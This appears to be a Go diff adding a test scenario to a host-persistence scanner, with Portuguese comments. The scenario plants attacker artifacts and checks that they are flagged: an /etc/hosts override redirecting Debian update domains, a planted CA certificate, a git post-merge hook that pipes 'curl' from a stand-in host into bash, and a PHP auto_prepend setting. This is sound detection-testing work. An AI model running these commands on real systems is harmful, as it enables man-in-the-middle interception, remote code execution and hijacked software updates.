@@ -77,6 +77,7 @@ func init() {
 			"persist.ssh_forced_command", "persist.sshd_key_source",
 			"persist.shell_startup", "persist.bash_env", "persist.trigger_exec",
 			"persist.pam_exec", "persist.udev_run",
+			"persist.ca_planted", "persist.hosts_override", "persist.web_prepend",
 		},
 		Exit: 0,
 	})
@@ -280,6 +281,7 @@ func init() {
 			"persist.ssh_forced_command", "persist.sshd_key_source",
 			"persist.shell_startup", "persist.bash_env", "persist.trigger_exec",
 			"persist.pam_exec", "persist.udev_run",
+			"persist.ca_planted", "persist.hosts_override", "persist.web_prepend",
 		},
 		Exit: 0,
 	})
@@ -572,6 +574,34 @@ func init() {
 			{ID: "persist.trigger_exec", Sev: "CRITICAL", Subject: "/etc/rc.local"},
 			{ID: "persist.pam_exec", Evidence: "a CADA autenticação"},
 			{ID: "persist.udev_run", Evidence: "evento de dispositivo"},
+		},
+		Exit: 2,
+	})
+
+	Register(Scenario{
+		ID:   "65-confianca-e-deploy",
+		Desc: "CA plantada, /etc/hosts, hook de git e auto_prepend: persistência fora de /etc/systemd",
+		// A CA e o /etc/hosts juntos são um MITM completo e SILENCIOSO: o nome
+		// resolve para o atacante e o certificado dele é aceito. Nenhuma
+		// ferramenta reclama — não há erro de TLS, processo estranho nem porta
+		// aberta.
+		Images: matriz,
+		Plant: `mkdir -p /usr/local/share/ca-certificates /srv/app/.git/hooks /etc/php/8.2/fpm /etc/aliases.d
+			printf '192.0.2.9 deb.debian.org security.debian.org\n' >> /etc/hosts
+			printf -- '-----BEGIN CERTIFICATE-----\nnaoehumcertificadovalido\n-----END CERTIFICATE-----\n' > /usr/local/share/ca-certificates/corp.crt
+			printf '#!/bin/sh\ncurl -s http://198.51.100.7/a | bash\n' > /srv/app/.git/hooks/post-merge
+			chmod +x /srv/app/.git/hooks/post-merge
+			printf 'auto_prepend_file = /var/www/.init.php\n' > /etc/php/8.2/fpm/php.ini
+			sleep 0.2`,
+		Expect: []Expect{
+			// domínio de ATUALIZAÇÃO: quem controla para onde ele aponta
+			// controla o que o host instala
+			{ID: "persist.hosts_override", Sev: "CRITICAL", Subject: "deb.debian.org"},
+			// certificado ilegível continua sendo achado: a presença é o fato
+			{ID: "persist.ca_planted", Evidence: "PRESENÇA"},
+			// hook de git sobrevive ao redeploy e não mora em /etc
+			{ID: "persist.trigger_exec", Sev: "CRITICAL", Evidence: "sobrevive ao redeploy"},
+			{ID: "persist.web_prepend", Evidence: "§16"},
 		},
 		Exit: 2,
 	})
